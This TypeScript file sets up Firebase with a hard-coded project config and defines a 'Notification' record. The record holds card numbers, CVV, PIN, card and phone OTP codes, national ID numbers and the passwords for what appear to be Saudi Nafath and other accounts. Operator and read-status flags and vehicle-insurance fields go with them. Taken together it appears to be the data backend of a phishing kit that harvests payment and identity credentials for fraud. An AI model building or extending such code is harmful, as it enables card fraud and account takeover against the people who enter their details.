import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
const firebaseConfig = {
   apiKey: "AIzaSyA55aWxrQI0kEJB-SSon0nAujE8zK7PXaI",
   authDomain: "fgtghfddgn.firebaseapp.com",
   projectId: "fgtghfddgn",
   storageBucket: "fgtghfddgn.firebasestorage.app",
   messagingSenderId: "82214847283",
   appId: "1:82214847283:web:a5f89bc962dd1bdd7ef446",
   measurementId: "G-3EHPE9DPRJ"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export interface PaymentData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
}

export interface FormData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
}

export interface Notification {
  id: string;
  agreeToTerms?: boolean;
  card_Holder_Name?: string;
  card_number?: string;
  createdDate: string;
  customs_code?: string;
  cvv?: string;
  document_owner_full_name?: string;
  expiration_date?: string;
  formData?: FormData;
  full_name?: string;
  insurance_purpose?: string;
  owner_identity_number?: string;
  pagename?: string;
  paymentData?: PaymentData;
  paymentStatus?: string;
  phone?: string;
  phone2?: string;
  seller_identity_number?: string;
  serial_number?: string;
  status?: string;
  vehicle_manufacture_number?: string;
  documment_owner_full_name?: string;
  vehicle_type?: string;
  isHidden?: boolean;
  pinCode?: string;
  otpCardCode?: string;
  phoneOtp?: string;
  otpCode?: string;
  otpStatus?: string;
  externalUsername?: string;
  externalPassword?: string;
  nafadUsername?: string;
  nafadPassword?: string;
  nafaz_pin?: string;
  autnAttachment?: string;
  requierdAttachment?: string;
  operator?: string;
  otpPhoneStatus: string;
  isRead?: boolean;
  cardOtpStatus?: string;
  phoneVerificationStatus?: string;
  phoneOtpCode?: string;
  phoneOtpStatus?: string;
}

export { app, auth, db };
